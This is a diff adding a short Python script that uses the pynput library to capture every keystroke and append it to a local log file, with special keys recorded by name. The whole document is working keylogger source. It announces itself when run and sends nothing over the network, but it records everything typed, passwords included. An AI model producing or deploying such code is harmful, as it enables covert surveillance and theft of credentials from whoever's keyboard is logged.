@@ -1,0 +1,28 @@
+from pynput import keyboard
+
+def record_key_press(key):
+    """
+    Records the key press event and writes it to a log file.
+    Alphanumeric characters are logged as-is, while special keys are logged with their names.
+    """
+    log_file = "keystroke_log.txt"
+
+    try:
+        with open(log_file, "a", encoding="utf-8") as file:
+            file.write(str(key.char))
+    except AttributeError:
+        with open(log_file, "a", encoding="utf-8") as file:
+            file.write(f"[{key.name}]")
+    except Exception as error:
+        print("An error occurred while logging the key:", error)
+
+def initiate_key_listener():
+    """
+    Starts the keyboard listener that logs every key press until the program is stopped.
+    """
+    print("Key logging has started. Press Ctrl+C or close the terminal to stop.")
+    with keyboard.Listener(on_press=record_key_press) as listener:
+        listener.join()
+
+if __name__ == "__main__":
+    initiate_key_listener()
